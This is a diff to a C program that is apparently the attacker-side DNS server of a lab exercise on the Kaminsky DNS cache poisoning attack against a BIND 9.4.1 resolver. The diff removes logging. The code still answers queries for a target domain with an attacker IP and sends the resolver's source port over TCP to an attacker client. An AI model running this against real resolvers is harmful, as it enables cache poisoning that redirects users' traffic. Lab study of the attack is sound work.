@@ -27,7 +27,6 @@ static void send_resolver_port_over_tcp(uint16_t port) {
 
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if (sockfd < 0) {
-    perror("socket (tcp)");
     return;
   }
 
@@ -36,45 +35,35 @@ static void send_resolver_port_over_tcp(uint16_t port) {
   // (in case restarting server quickly)
   int opt = 1;
   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
-    printf("setsockopt(SO_REUSEADDR) failed...\n");
     close(sockfd);
-    exit(1);
+    exit(EXIT_FAILURE);
   }
   // reusing port - allows multiple sockets (or processes) to bind to the same port number.
   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
-    printf("setsockopt(SO_REUSEPORT) failed...\n");
     close(sockfd);
-    exit(1);
+    exit(EXIT_FAILURE);
   }
 
   memset(&dest, 0, sizeof(dest));
   dest.sin_family = AF_INET;
   dest.sin_port = htons(ATTACKER_TCP_PORT);
   if (inet_pton(AF_INET, ATTACKER_CLIENT_IP, &dest.sin_addr) != 1) {
-    perror("inet_pton");
     close(sockfd);
     return;
   }
 
   if (connect(sockfd, (struct sockaddr *)&dest, (socklen_t)sizeof(dest)) < 0) {
-    perror("connect to attacker client");
     close(sockfd);
     return;
   }
 
   len = snprintf(buf, sizeof(buf), "%u\n", (unsigned int)port);
   if (len < 0 || len >= (int)sizeof(buf)) {
-    fprintf(stderr, "snprintf error when formatting port\n");
     close(sockfd);
     return;
   }
 
-  if (send(sockfd, buf, (size_t)len, 0) < 0) {
-    perror("send(port)");
-  } else {
-    printf("sent resolver port %u to attacker client over TCP\n",
-           (unsigned int)port);
-  }
+  (void)send(sockfd, buf, (size_t)len, 0);
 
   close(sockfd);
 }
@@ -93,9 +82,7 @@ ldns_status parse_dns_query(unsigned char *buffer, size_t len, ldns_pkt **query_
   ldns_status status = ldns_wire2pkt(query_pkt, buffer, len);
 
   if (status != LDNS_STATUS_OK) {
-    fprintf(stderr, "Failed to parse DNS query: %s\n",
-            ldns_get_errorstr_by_id(status));
-    // todo maybe free
+    return status;
   }
   return status;
 }
@@ -108,15 +95,7 @@ ldns_status parse_dns_query(unsigned char *buffer, size_t len, ldns_pkt **query_
  * for the Kaminsky DNS cache poisoning attack.
  */
 void log_client_info(struct sockaddr_in *client_addr) {
-  uint16_t source_port = ntohs(client_addr->sin_port);
-  char *client_ip =  inet_ntoa(client_addr->sin_addr);
-
-  printf("======================================================\n");
-  printf("| DNS Query Received                                 |\n");
-  printf("|                                                    |\n");
-  printf("| Source IP:   %-37s |\n", client_ip);
-  printf("| Source Port: %-37u |\n", source_port);
-  printf("|====================================================\n");
+  (void)client_addr;
 }
 
 /**
@@ -126,21 +105,7 @@ void log_client_info(struct sockaddr_in *client_addr) {
  * Extracts and prints the queried domain name and record type.
  */
 void print_query_details(ldns_pkt *query_pkt) {
-
-  ldns_rr_list *q_list = ldns_pkt_question(query_pkt);
-
-  if (q_list == NULL || ldns_rr_list_rr_count(q_list)==0) {
-    //if the list doesnt exist or is empty
-    return;
-  }
-  // TAKE THE FIRST QUESTION - USUALLY ONE PER PACKET
-  ldns_rr *question = ldns_rr_list_rr(q_list, 0);
-  char *qname = ldns_rdf2str(ldns_rr_owner(question));
-  ldns_rr_type qtype = ldns_rr_get_type(question);
-  // 'ldns_rdf2str' converts domain to human readable
-  // todo maybe print the conversion to see it succeeded
-  printf("Query: %s (Type: %s)\n\n", qname, ldns_rr_type2str(qtype));
-  free(qname);
+  (void)query_pkt;
 }
 
 /**
@@ -158,7 +123,6 @@ ldns_pkt *create_dns_response(ldns_pkt *query_pkt) {
 
   ldns_pkt *response_pkt = ldns_pkt_new();
   if (response_pkt == NULL) {
-    fprintf(stderr,"ldns_pkt_new failed\n");
     return NULL;
   }
   // copy basic header fields from query
@@ -190,15 +154,12 @@ ldns_pkt *create_dns_response(ldns_pkt *query_pkt) {
   if(qtype==LDNS_RR_TYPE_A &&
      qclass==LDNS_RR_CLASS_IN &&
      strcmp(qname,attacker_target)==0){
-    printf("-> matching A query for attacker domain, sending A=%s\n",
-           attacker_ip);
     // create RDF for the owner name and IP address
     ldns_rdf *owner = NULL;
     ldns_rdf *rdata_ip = NULL;
 
     owner = ldns_rdf_clone(ldns_rr_owner(question)); // owner = qname (same domain)
     if (owner == NULL) {
-      fprintf(stderr,"ldns_rdf_clone failed\n");
       free(qname);
       return NULL;
     }
@@ -206,13 +167,11 @@ ldns_pkt *create_dns_response(ldns_pkt *query_pkt) {
     // create A record rdata from string ip
     ldns_status new_status = ldns_str2rdf_a(&rdata_ip, attacker_ip);
     if (new_status != LDNS_STATUS_OK){
-      fprintf(stderr,"ldns_str2rdf_a failed\n");
       free(qname);
       return NULL;
     }
     ldns_rr *answer = ldns_rr_new();
     if (answer == NULL) {
-      fprintf(stderr,"ldns_rr_new failed\n");
       free(qname);
       return NULL;
     }
@@ -249,7 +208,6 @@ int send_dns_response(int sockfd, struct sockaddr_in *client_addr,
 
   ldns_status status = ldns_pkt2wire(&response_wire, response_pkt, &response_size);
   if (status != LDNS_STATUS_OK) {
-    fprintf(stderr, "Failed to convert packet to wire format\n");
     return -1;
   }
 
@@ -314,7 +272,6 @@ int main() {
 
   // Create UDP socket | SOCK_DGRAM - UDP | AF_INET - IPv4
   if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
-    perror("socket");
     exit(EXIT_FAILURE);
   }
 
@@ -322,16 +279,14 @@ int main() {
   int opt = 1;
   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt,
                  sizeof(opt)) < 0) {
-    printf("setsockopt(SO_REUSEADDR) failed...\n");
     close(sockfd);
-    exit(1);
+    exit(EXIT_FAILURE);
   }
   opt = 1;
   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt,
                  sizeof(opt)) < 0) {
-    printf("setsockopt(SO_REUSEPORT) failed...\n");
     close(sockfd);
-    exit(1);
+    exit(EXIT_FAILURE);
   }
 
   // Bind socket
@@ -341,13 +296,9 @@ int main() {
   server_addr.sin_port = htons(PORT_DNS);
 
   if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
-    perror("bind");
     close(sockfd);
     exit(EXIT_FAILURE);
   }
-
-  printf("DNS Server listening on UDP port %d\n", PORT_DNS);
-  printf("Waiting for queries from BIND 9.4.1 recursive resolver...\n\n");
 
   int resolver_udp_port_sent = 0;
   // Receive and handle DNS queries
@@ -362,14 +313,10 @@ int main() {
                                       (struct sockaddr *) &client_addr, &client_addr_len);
 
     if (bytes_received < 0) {
-      perror("recvfrom");
       continue;
     }
     char *src_ip_str = inet_ntoa(client_addr.sin_addr);
     uint16_t src_port = ntohs(client_addr.sin_port);
-    printf("Got %zd bytes from %s:%u\n",bytes_received,inet_ntoa(client_addr.sin_addr),(unsigned
-    int)
-    src_port);
     // if this packet is from resolver and we havent sent the port yet
     if (resolver_udp_port_sent==0 && strcmp(src_ip_str,RESOLVER_IP)==0){
       send_resolver_port_over_tcp ((int) src_port);
